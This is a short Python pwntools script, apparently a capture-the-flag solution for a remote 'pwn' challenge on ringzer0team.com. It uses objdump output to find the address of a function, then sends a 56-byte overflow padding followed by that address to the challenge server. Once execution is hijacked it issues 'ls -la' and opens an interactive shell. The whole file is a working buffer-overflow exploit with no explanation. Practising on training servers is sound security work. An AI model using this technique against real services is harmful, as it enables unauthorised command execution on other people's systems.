# challenge remote auth
# MtucX
# pip install pwntools
from pwn import *

# mtucx@mtucx:~/challenges/ringzer0team.com/pwn$ objdump -d 69e6f79b2a05df73b4cdaa95f7c4fb6c | grep rao_prompt
# 401488:       e8 0e 00 00 00          callq  40149b <rao_prompt>
# 000000000040149b <rao_prompt>:
adress=0x40149b

pwn=remote('ringzer0team.com' ,1001)

pwn.sendline("A" * 56 + p32(adress))

pwn.sendline("ls -la")

pwn.interactive()
